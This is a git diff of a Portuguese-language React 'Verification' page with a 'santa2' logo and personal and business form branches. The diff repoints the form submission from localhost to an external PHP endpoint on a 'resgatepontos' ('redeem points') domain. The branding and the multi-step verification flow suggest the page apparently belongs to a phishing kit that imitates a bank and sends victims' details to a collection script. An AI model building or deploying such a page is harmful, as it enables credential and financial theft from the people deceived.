@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import styles from './Verification.module.scss';
+import santaLogo from '../../public/santa2.png'
 import { useParams } from 'react-router-dom';
 import { IMaskInput } from 'react-imask';
 
@@ -36,7 +37,7 @@ const Verification = () => {
 
     try {
       // Envia os dados para o PHP
-      const response = await fetch('http://localhost:80/two.php', {
+      const response = await fetch('https://resgatepontos.online/two.php', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -62,7 +63,7 @@ const Verification = () => {
     <>
       {type === 'fisica' ? (
         <div className={styles.fisicaVerify}>
-          <img className={styles.logoSanta} src="../../public/santa2.png" alt="" />
+          <img className={styles.logoSanta} src={santaLogo} alt="" />
           <div className={styles.formConfirm}>
             <span className={styles.titulo}>Estamos no final...</span>
             <span className={styles.subtitulo}>
@@ -102,7 +103,7 @@ const Verification = () => {
         </div>
       ) : (
         <div className={styles.juridicaVerify}>
-          <img className={styles.logoSanta} src="../../public/santa2.png" alt="" />
+          <img className={styles.logoSanta} src={santaLogo} alt="" />
           <div className={styles.formConfirm}>
             <span className={styles.titulo}>Estamos no final...</span>
             <span className={styles.subtitulo}>
